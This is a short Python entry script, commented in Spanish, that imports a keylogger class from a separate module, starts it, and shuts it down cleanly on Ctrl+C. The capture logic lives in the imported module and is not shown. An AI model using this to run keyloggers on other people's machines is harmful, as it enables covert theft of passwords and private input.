
from keylogger import keylogger
import signal
import sys

# Función para manejar la señal de interrupción
# Si se presiona Ctrl + C se cerrará el programa
def signal_handler(sig, frame):
    print("Exiting...")
    
    # Se llama a la función shutdown del keylogger
    my_keylogger.shutdown()
    sys.exit(1)

# signal.signal() se encarga de manejar las señales del sistema
signal.signal(signal.SIGINT, signal_handler)
    

if __name__ == "__main__":
    my_keylogger = keylogger()
    my_keylogger.start()
